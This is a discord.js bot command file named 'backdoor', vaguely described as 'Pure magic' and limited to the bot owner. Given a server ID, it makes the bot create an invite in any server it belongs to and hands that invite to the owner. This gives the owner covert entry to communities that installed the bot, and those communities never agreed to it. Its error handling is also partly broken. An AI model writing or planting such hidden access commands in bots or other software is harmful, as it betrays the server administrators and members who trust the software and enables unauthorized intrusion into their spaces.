const { prefix, ownerId } = require('../../config.json');
const colours = require('../../colours.json');
const { MessageEmbed } = require('discord.js');

module.exports = {
    config: {
    name: 'backdoor',
    description: 'Pure magic',
    usage: `${prefix}backdoor <server-id>`,
    category: 'restricted',
    access: 'restricted',
    aliases: ['bd']
},

run: async (client, message, args) => {

  if (message.author.id != ownerId) return message.reply('You don\'t have permission to use this command.')

  let guildId = args[0]

  const  embed = new MessageEmbed()
  if(!guildId || isNaN(guildId) || guildId.length > 18) return message.reply('Please provide a guild ID!');
  let guild = client.guilds.cache.get(guildId);
  if(!guild) return message.channel.send(embed.setColor(colours.red).setDescription('The bot isn\'t in that guild.'));
  let invitePossiblites = guild.channels.cache.filter(cha => cha.permissionsFor(guild.me).has('CREATE_INSTANT_INVITE'));
  if(!invitePossiblites) return message.channel.send(embed.setColor(colours.red).setDescription('I Couldn\'t fetch a channel that allows me to make an invite.'));

  try {
    invitePossiblites.random().createInvite()
      .then(invite => {
      message.channel.send(embed.setColor(colours.green).setDescription(`Success! Found an invite! 
      **[Invite](${`https://discordapp.com/invite/${invite.code})** || **Code:** ${invite.code}`}`));
      }) 
      } catch(err) {
        message.channel.send(embed.setColor(colours.red).setDescription(`I couldn\'t make an invite.`))
      }

}
} 